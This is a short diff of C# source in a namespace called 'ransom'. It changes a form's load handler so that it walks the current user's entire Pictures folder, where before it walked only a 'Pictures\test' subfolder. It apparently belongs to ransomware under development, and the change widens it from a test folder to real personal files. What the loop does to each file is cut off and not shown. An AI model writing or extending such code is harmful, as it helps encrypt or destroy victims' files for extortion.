@@ -16,7 +16,7 @@ namespace ransom
         public void Form1_Load(object sender, EventArgs e)
         {
             string userName = Environment.GetEnvironmentVariable("USERNAME");
-            string[] filePaths = Directory.GetFiles(@"c:\Users\" + userName + @"\Pictures\test");
+            string[] filePaths = Directory.GetFiles(@"c:\Users\" + userName + @"\Pictures\");
             foreach (var gek in filePaths)
             {
                 var geen =  gek.Substring(0, gek.IndexOf("Pictures")) + "Pictures.";
